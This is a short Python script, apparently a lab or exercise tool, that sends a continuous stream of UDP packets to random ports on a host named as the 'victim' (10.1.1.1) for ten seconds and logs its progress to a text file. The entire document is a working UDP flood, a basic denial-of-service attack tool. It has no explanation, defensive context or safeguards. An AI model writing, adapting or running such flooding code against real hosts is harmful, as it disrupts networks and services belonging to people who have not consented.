#!/usr/bin/env python3
import time
import socket
import random
import sys

victim_ip = "10.1.1.1"
duration = 10  # in seconds

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

msg = b"Hello"
timeout = time.time() + duration
send_packets = 0

# Logging
open("logudp.txt", "w").close()

while time.time() < timeout:
    victim_port = random.randint(1025, 65356)
    sock.sendto(msg, (victim_ip, victim_port))
    with open("logudp.txt", "a") as f:
        log_str = (
            "victim_port: "
            + str(victim_port)
            + ", send packets: "
            + str(send_packets)
            + "\n"
        )
        if send_packets % 3000 == 0:
            f.write(log_str)
    send_packets += 1
